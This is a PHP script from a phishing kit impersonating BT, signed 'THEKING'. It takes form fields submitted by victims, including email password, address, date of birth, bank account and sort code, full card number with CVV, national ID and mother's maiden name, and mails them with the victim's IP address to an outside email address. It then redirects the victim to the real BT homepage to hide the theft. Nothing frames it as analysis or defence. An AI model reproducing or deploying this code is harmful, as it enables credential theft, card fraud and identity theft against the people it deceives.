<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------+ BT by THEKING +-----------------\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Pass : ".$_POST['password']."\n";
$message .= "Title : ".$_POST['title']."\n";
$message .= "Full Name : ".$_POST['first_name']." ".$_POST['last_name']."\n";
$message .= "Address : ".$_POST['address2']."\n";
$message .= "City : ".$_POST['city']."\n";
$message .= "State : ".$_POST['co_plc_country_code']."\n";
$message .= "Post Code : ".$_POST['zip']."\n";
$message .= "House PhoneNumber : ".$_POST['H_PhoneNumber']."\n";
$message .= "Mobile PhoneNumber : ".$_POST['mobile']."\n";
$message .= "DOB mm/dd/yyyy: ".$_POST['monthOfBirth']."/".$_POST['dayOfBirth']."/".$_POST['yearOfBirth']."\n";
$message .= "Acct Num : ".$_POST['account_number']."\n";
$message .= "Sort COde : ".$_POST['sort_code']."\n";
$message .= "Card Type : ".$_POST['credit_card_type_select']."\n";
$message .= "Card Number : ".$_POST['recc_number']."\n";
$message .= "Card Name : ".$_POST['recc_name']."\n";
$message .= "Card Start mm/yyyy: ".$_POST['startdate_month']."/".$_POST['startdate_year']."\n";
$message .= "Card Expiry mm/yyyy: ".$_POST['expdate_month']."/".$_POST['expdate_year']."\n";
$message .= "Card Issue Num: ".$_POST['issue_number']."\n";
$message .= "Cvv : ".$_POST['cvv2_number']."\n";
$message .= "National Id : ".$_POST['natid']."\n";
$message .= "MMN : ".$_POST['mmn']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------+ BT by THEKING +-----------------\n";


$send = "rebel.d@outlook.com";
$subject = "BT - Result | $ip";
$headers = "From: THEKING <rebel.d@outlook.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
header("Location: http://home.bt.com");

mail($send,$subject,$message,$headers);
       mail($cc,$subject,$message,$headers);

	  

?>